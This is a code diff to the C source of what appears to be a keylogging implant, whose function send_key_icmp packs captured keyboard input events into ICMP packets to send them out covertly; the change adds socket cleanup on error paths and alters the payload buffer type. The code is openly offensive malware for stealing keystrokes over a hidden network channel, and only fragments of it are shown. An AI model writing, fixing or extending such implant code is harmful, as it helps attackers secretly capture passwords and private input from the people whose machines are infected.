@@ -6,6 +6,7 @@
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
 #include <stdio.h>
+#include <unistd.h>
 #include "implant.h"
 
 /* Layout of the DATA packet is following
@@ -13,7 +14,7 @@
  */
 int send_key_icmp(implant_t *implant, struct input_event event) {
 
-    uint8_t payload[sizeof(struct input_event) + 32] = {0};
+    char payload[sizeof(struct input_event) + 32] = {0};
 
     /* for the userland implant, we will always assume the locale is
      * US, because I haven't yet found a way to hook evdev driver from here
@@ -37,6 +38,8 @@ int send_key_icmp(implant_t *implant, struct input_event event) {
         perror("socket");
 #endif
 
+cleanup_error:
+        close(sockfd);
         return ERROR;
     }
 
@@ -50,7 +53,7 @@ int send_key_icmp(implant_t *implant, struct input_event event) {
         perror("setsockopt");
 #endif
 
-        return ERROR;
+        goto cleanup_error;
     }
 
     if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
@@ -62,7 +65,7 @@ int send_key_icmp(implant_t *implant, struct input_event event) {
         perror("setsockopt");
 #endif
 
-        return ERROR;
+        goto cleanup_error;
     }
 
     /* set packet metadata */
